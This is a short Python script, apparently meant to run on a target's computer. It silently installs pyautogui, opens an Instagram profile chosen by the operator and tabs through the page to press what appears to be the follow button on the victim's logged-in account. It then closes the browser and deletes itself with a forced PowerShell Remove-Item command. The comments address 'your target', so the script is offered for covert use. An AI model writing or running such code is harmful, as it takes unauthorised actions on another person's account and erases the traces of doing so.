import os
import sys
import subprocess
import time
#You may need to change time to sleep depending on your targets connection!

# Function to install a Python package using pip
def install_package(package_name):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])

# Try importing the library. If it fails, install it.
try:
    import pyautogui
except ImportError:
    install_package("pyautogui")
    import pyautogui

import time
import webbrowser

# Replace this link with the link to your profile!
INSTAGRAM_LINK = 'https://www.instagram.com/YOUR_PROFILE'

webbrowser.open(INSTAGRAM_LINK)

time.sleep(5)

# 13 is needed for firefox, which i did the tests on.
# 12 may be needed for chrome, more testing needed.
for _ in range(13):
    pyautogui.press('tab')
    time.sleep(0.5)

pyautogui.press('enter')
time.sleep(3)
pyautogui.hotkey('alt', 'f4')
time.sleep(3)
script_path = os.path.abspath(sys.argv[0])
cmd = f'powershell Remove-Item "{script_path}" -Force'
subprocess.Popen(cmd, shell=True)
